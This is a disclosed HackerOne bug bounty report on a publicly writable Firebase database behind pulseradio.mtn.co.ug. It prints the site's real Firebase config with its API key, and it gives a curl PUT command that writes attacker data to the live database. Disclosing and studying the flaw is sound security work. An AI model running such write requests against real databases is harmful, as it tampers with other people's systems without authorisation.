---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1447751'
original_report_id: '1447751'
title: Firebase Database Takeover in https://pulseradio.mtn.co.ug/
weakness: Insecure Storage of Sensitive Information
team_handle: mtn_group
created_at: '2022-01-12T10:02:04.829Z'
disclosed_at: '2022-12-01T10:52:59.962Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
asset_identifier: mtn.co.ug
asset_type: URL
max_severity: critical
tags:
- hackerone
- insecure-storage-of-sensitive-information
---

# Firebase Database Takeover in https://pulseradio.mtn.co.ug/

## Metadata

- HackerOne Report ID: 1447751
- Weakness: Insecure Storage of Sensitive Information
- Program: mtn_group
- Disclosed At: 2022-12-01T10:52:59.962Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
During my test , in one of the subdomain of mtn.co.ug I found firebase configuration disclosed in the source code along with apiKey and database URL . 

Exploiting this vulnerability attacker is able to upload malicious data in the firebase account of pulseradio.mtn.co.ug and see database over there .

## Steps To Reproduce:

POC :  https://mtn-pulse-uganda.firebaseio.com/poc.json

1. Go to URL below and view the source code of website .

view-source:https://pulseradio.mtn.co.ug/wp-content/themes/mtn-pulse-reskin/zero-rate/firebase-config.js

There you will see following sensitive data .

$(document).ready(function() {
			// Your web app's Firebase configuration
			var firebaseConfig = {
				apiKey: "AIzaSyCRrABG3_Sc7xHar70hFyjHjEOJ071rbJ4",
				authDomain: "mtn-pulse-uganda.firebaseapp.com",
				databaseURL: "https://mtn-pulse-uganda.firebaseio.com",
				projectId: "mtn-pulse-uganda",
				storageBucket: "mtn-pulse-uganda.appspot.com",
				messagingSenderId: "242450689592",
				appId: "1:242450689592:web:bdd1173378d94d733800cd",
				measurementId: "G-KHPT64LJ5L"
			};


2. Now lets upload some data in firebase database  . Send the following curl request . Your data will be uploaded to firebase .


 curl "https://mtn-pulse-uganda.firebaseio.com/poc1.json" -XPUT -d '{"attacker":"maliciousdata"}'

3. Your data will be uploaded to https://mtn-pulse-uganda.firebaseio.com/poc1.json



References:
There are guidelines available by Firebase to resolve the insecurities and misconfiguration, please follow this link:
https://firebase.google.com/docs/database/security/resolve-insecurities

## Impact

This is quite serious because by using this database attacker can use this for malicious purposes and also an attacker can track this database if mtn uses it for future perspective and at that time it will be much easier for the attacker to steal the data from this repository and later it will harm the reputation of the mtn.co.ug .

So please immediately change the rule of the database to private so that nobody can able to access it outside.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
